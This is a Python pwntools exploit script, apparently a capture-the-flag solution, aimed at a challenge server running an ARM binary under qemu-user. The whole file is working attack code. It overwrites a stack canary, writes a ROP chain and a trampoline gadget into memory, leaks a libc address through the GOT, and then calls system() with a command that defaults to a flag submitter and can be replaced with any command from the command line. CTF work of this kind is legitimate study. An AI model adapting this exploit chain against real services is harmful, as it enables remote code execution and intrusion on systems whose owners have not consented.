#!/usr/bin/python
from pwn import *
import sys

HOST = 'challenge.pwny.racing'
PORT = 11535

LIBC = 0x593f0
SYST = 0x2d4cc
CMD  = './flag_submitter test'

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

if len(sys.argv) > 3:
    CMD = sys.argv[3]

# Note: This exploit will take advantage of the fact the vulnerable
#       application is run in qemu-user, which has known limitations.
#       There are several ways to complete this challenge without
#       using these factors, but since the path of least resistence
#       is the most attractive, this exploit will run over two runs
#       to confirm the base address of libc. It makes the code longer
#       than it needs to be.

# RUN 1: Leaking libc base address

io = remote(HOST, PORT)

print io.recvuntil('Sum')[:-10]
io.recvline()

# step 1: fill the buffer to eat up some stack
for i in range(16):
	io.recvuntil('<< ')
	io.sendline('1')

# step 2: overwrite the stack canary on the stack
io.recvuntil('<< ')
io.sendline('0')

# step 3: write rop chain to bounce to trampoline where
#         there is a gadget to populate registers
rop = [
	0x00000002,  # lr => junk
	0x00022010,  # pc => .data trampoline

	0x00000001,  # r0 => stdout
	0x00021fec,  # r1 => memset@GOT
	0x00000010,  # r2 => length
	0x10624,     # pc => bl write()

]

for addr in rop:
	if addr > 0x7fffffff:
		addr = 0-(0x100000000 - addr)

	io.recvuntil('<< ')
	io.sendline(str(addr))

# step 4: write trampoline gadget in .data
io.recvuntil('<< ')
io.sendline(p32(0xe8bd8007))  # pop {r0,r1,r2,pc}

# step 5: close the write end of the socket to get EOF from read()
#         which causes an out of bounds NULL write over the stack
#         canary stored in .bss
io.shutdown('send')

# step 6: collect the leak
io.recvuntil('<< ')
leak = io.recvline().strip()[:4]
leak = u32(leak)
libc = leak - LIBC

log.info('leak: 0x%08x' % leak)
log.info('libc: 0x%08x' % libc)

io.close()

# RUN 2: Run arbitrary command

io = remote(HOST, PORT)

io.recvuntil('Sum')
io.recvline()

# step 1: fill the buffer to eat up some stack
for i in range(16):
	io.recvuntil('<< ')
	io.sendline('1')

# step 2: overwrite the stack canary on the stack
io.recvuntil('<< ')
io.sendline('0')

# step 3: write rop chain
rop = [
	0x00000002,  # lr
	0x00022010,  # pc => .data trampoline

	0x00022014,   # r0 => command string
	libc+SYST-1,  # pc => system()
]

for addr in rop:
	if addr > 0x7fffffff:
		addr = 0-(0x100000000 - addr)

	io.recvuntil('<< ')
	io.sendline(str(addr))

# step 4: write trampoline gadget and command
pay  = p32(0xe8bd8001)  # pop {r0,pc} 
pay += CMD+'\n'

io.recvuntil('<< ')
io.sendline(pay)

# step 5: close the write end of the socket to get EOF from read()
#         which causes an out of bounds NULL write over the stack
#         canary stored in .bss
io.shutdown('send')

# done
io.recvuntil('<< ')
out = io.recvuntil('/home/ctf/redir.sh:')[:-19].strip()
print out

io.close()
